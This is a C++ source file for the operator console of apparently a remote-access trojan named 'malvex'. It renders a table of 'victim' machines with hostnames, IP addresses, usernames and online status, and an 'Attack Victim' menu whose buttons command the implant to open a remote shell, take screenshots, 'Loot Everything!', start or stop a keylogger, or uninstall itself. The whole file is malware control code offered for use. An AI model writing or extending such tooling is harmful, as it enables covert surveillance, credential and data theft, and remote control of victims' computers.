#include "UiShared.hpp"
#include "Client.hpp"
#include "LogManager.hpp"
#include "SessionManager.hpp"
#include "Types.hpp"

#include <format>

void drawConnectionsTab(WindowState& state) {
    static Vector2 scroll = {0, 0};
    static Rectangle view = {0, 0, 0, 0};
    static Rectangle content = {0, 0, 0, 30 * 25};
    static Vector2 menuPos = {};
    static bool menuVisible = false;
    static int selectedRow = -1;
    static int hoveredRow = -1;
    static LogManager& logMan = LogManager::instance();
    static auto port = gen_port();

    const auto& res{ state.res };
    const Color panel_fill{36, 36, 46, 255};
    const Color panel_border{90, 90, 110, 255};

    const auto page = ui::content_area(res);
    draw_malvex_section_header(page, "List of Victim Connections");
    auto body = ui::section_content(page);

    if (GuiButton(ui::toolbar_button(body.x, body.y, 150), GuiIconText(ICON_REPEAT_FILL, "Refresh List"))) {
        if (Client::instance().fetchVictims()) {
            logMan.local_log("Fetched Victims from Server");
        } else {
            logMan.local_log("Refreshing the Victim List failed!");
        }
    }

    Rectangle table_panel{
        body.x,
        body.y + ui::kControlHeight + ui::kGap,
        body.width,
        std::max(0.0f, body.height - ui::kControlHeight - ui::kGap),
    };
    ui::draw_panel_frame(table_panel, panel_fill, panel_border);

    const auto table_body = ui::panel_body(table_panel, false);

    const char* headers[] = {
        "ID", "Hostname", "LAN", "WAN", "OS",
        "Username", "Status"
    };
    constexpr int colCount = 7;

    const float col_width = table_body.width / colCount;
    constexpr float row_height = 28.0f;

    for (int i = 0; i < colCount; i++) {
        Rectangle header_cell{
            table_body.x + i * col_width,
            table_body.y,
            col_width,
            row_height,
        };
        ui::draw_rounded_rect(header_cell, {52, 52, 64, 255}, {70, 70, 86, 255});
        GuiLabel(ui::inset(header_cell, 6.0f), headers[i]);
    }

    Rectangle panelRect{
        table_body.x,
        table_body.y + row_height + 4.0f,
        table_body.width,
        std::max(0.0f, table_body.height - row_height - 4.0f),
    };

    Vector2 mouse = GetMousePosition();

    if (not menuVisible && CheckCollisionPointRec(mouse, panelRect)) {
        float localY = mouse.y - panelRect.y - scroll.y;
        if (localY >= 0 && localY < content.height) {
            hoveredRow = static_cast<int>(localY / row_height);
            if (hoveredRow >= 50) {
                hoveredRow = -1;
            }
        }
    }

    GuiScrollPanel(panelRect, nullptr, content, &scroll, &view);

    BeginScissorMode(
        static_cast<int>(panelRect.x),
        static_cast<int>(panelRect.y),
        static_cast<int>(panelRect.width),
        static_cast<int>(panelRect.height));

    auto& client = Client::instance();
    const auto& victims = client.getVictims();

    for (size_t client_id{0}; client_id < victims.size(); ++client_id) {
        const auto& vic{ victims[client_id] };
        const bool is_online = vic.status == 1;

        auto line_color = is_online
            ? (client_id % 2 == 0 ? Color{58, 58, 72, 255} : Color{46, 46, 58, 255})
            : (client_id % 2 == 0 ? Color{40, 40, 44, 255} : Color{34, 34, 38, 255});

        if (static_cast<int>(client_id) == hoveredRow) {
            line_color = is_online ? Color{150, 30, 70, 255} : Color{58, 58, 64, 255};
        }

        const std::string values[colCount]{
            std::to_string(vic.id),
            vic.hostname,
            vic.internal_ip,
            vic.external_ip,
            vic.operating_system,
            vic.username,
            is_online ? "ONLINE" : "OFFLINE"
        };

        const int original_label_text = GuiGetStyle(LABEL, TEXT_COLOR_NORMAL);
        if (!is_online) {
            GuiSetStyle(LABEL, TEXT_COLOR_NORMAL, ColorToInt({110, 110, 118, 255}));
        }

        for (int i = 0; i < colCount; ++i) {
            Rectangle cell{
                table_body.x + i * col_width,
                table_body.y + row_height + 4.0f + scroll.y + row_height * static_cast<float>(client_id),
                col_width,
                row_height,
            };
            const Color border_color = is_online ? Color{40, 40, 50, 255} : Color{52, 52, 56, 255};
            ui::draw_rounded_rect(cell, line_color, border_color, 0.0f);
            GuiLabel(ui::inset(cell, 6.0f), values[i].c_str());
        }

        GuiSetStyle(LABEL, TEXT_COLOR_NORMAL, original_label_text);
    }

    if (IsMouseButtonPressed(MOUSE_RIGHT_BUTTON) && hoveredRow >= 0) {
        menuVisible = true;
        menuPos = mouse;
        selectedRow = hoveredRow;
    }

    if (menuVisible && IsMouseButtonPressed(MOUSE_LEFT_BUTTON)) {
        Rectangle menuArea{menuPos.x, menuPos.y, 320, 500};
        if (not CheckCollisionPointRec(mouse, menuArea)) {
            menuVisible = false;
        }
    }

    EndScissorMode();

    if (menuVisible && selectedRow >= 0) {
        const auto btn_height = ui::kControlHeight + 4.0f;
        Rectangle menuRect{menuPos.x, menuPos.y, 320, btn_height * 9 + ui::kPadding * 2};
        draw_malvex_panel(
            menuRect,
            GuiIconText(ICON_DEMON, TextFormat("Attack Victim #%d", selectedRow)),
            panel_fill,
            panel_border);

        const float menu_x = menuRect.x + ui::kPadding;
        const float menu_y = menuRect.y + 40.0f;
        const float menu_w = menuRect.width - ui::kPadding * 2.0f;

        Rectangle btn1{menu_x, menu_y + btn_height * 0, menu_w, ui::kControlHeight};
        Rectangle btn2{menu_x, menu_y + btn_height * 1, menu_w, ui::kControlHeight};
        Rectangle btn3{menu_x, menu_y + btn_height * 2, menu_w, ui::kControlHeight};
        Rectangle btn4{menu_x, menu_y + btn_height * 3, menu_w, ui::kControlHeight};
        Rectangle btn5{menu_x, menu_y + btn_height * 4, menu_w, ui::kControlHeight};
        Rectangle btn6{menu_x, menu_y + btn_height * 5, menu_w, ui::kControlHeight};
        Rectangle btn7{menu_x, menu_y + btn_height * 6, menu_w, ui::kControlHeight};
        Rectangle btn8{menu_x, menu_y + btn_height * 7, menu_w, ui::kControlHeight};

        const auto timeout = std::atol(state.user_settings.default_timeout.text);
        const auto victim = victims[selectedRow];

        if (GuiButton(btn1, TextFormat("Timeout Client %d for %d min", victim.id, static_cast<int>(timeout)))) {
            if (state.client.sendTimeoutCommand(victim.uid, timeout)) {
                logMan.attack_log(std::format("Timeout Command Send to Client: {}", victim.uid));
            } else {
                logMan.local_log("Sending Timeout Command failed!");
            }
            menuVisible = false;
        }

        if (GuiButton(btn2, TextFormat("Open Shell (Port: %d)", port))) {
            if (state.client.sendOpenSessionCommand(victim.uid, port)) {
                logMan.attack_log(std::format("Opening Session to Client: {} on Port: {}", victim.uid, port));

                if (state.client.openSession(port)) {
                    SessionManager::instance().startSession(
                        state.client.getServerHost(),
                        port,
                        state.client.getUsername(),
                        state.client.getPassword());
                }
            } else {
                logMan.local_log("Sending Open Session Command failed!");
            }
            menuVisible = false;
            port = gen_port();
            state.current_tab = Tab::TERMINAL;
        }
        if (GuiButton(btn3, "Close open Shells")) {
            if (state.client.sendCloseSessionCommand(victim.uid)) {
                logMan.attack_log(std::format("Closing Open Sessions for Client: {}", victim.uid));
            } else {
                logMan.local_log("Sending Timeout Command failed!");
            }
            menuVisible = false;
        }
        if (GuiButton(btn4, "Take Screenshot")) {
            if (state.client.sendScreenshotCommand((victim.uid))) {
                logMan.attack_log(std::format("Screenshot Command Send to Client: {}", victim.uid));
            } else {
                logMan.local_log("Sending Screenshot Command failed!");
            }
            menuVisible = false;
        }
        if (GuiButton(btn5, "Loot Everything!")) {
            if (state.client.sendLootCommand(victim.uid)) {
                logMan.attack_log(std::format("Loot Command Send to Client: {}", victim.uid));
            } else {
                logMan.local_log("Sending Loot Command failed!");
            }
            menuVisible = false;
        }
        if (GuiButton(btn6, "Start Keylogger")) {
            if (state.client.sendStartKeyloggerCommand(victim.uid)) {
                logMan.attack_log(std::format("Starting Keylogger on Client: {}", victim.uid));
            } else {
                logMan.local_log("Starting Keylogger failed!");
            }
            menuVisible = false;
        }
        if (GuiButton(btn7, "Stop Keylogger")) {
            if (state.client.sendStopKeyloggerCommand(victim.uid)) {
                logMan.attack_log(std::format("Stopping Keylogger on Client: {}", victim.uid));
            } else {
                logMan.local_log("Stopping Keylogger failed!");
            }
            menuVisible = false;
        }
        if (GuiButton(btn8, "Uninstall Implant")) {
            if (state.client.uninstallVictim(victim)) {
                logMan.attack_log(std::format("Uninstalling Implant on Client: {}", victim.uid));
                selectedRow = -1;
            } else {
                logMan.local_log("Uninstalling failed!");
            }
            menuVisible = false;
        }
    }
}
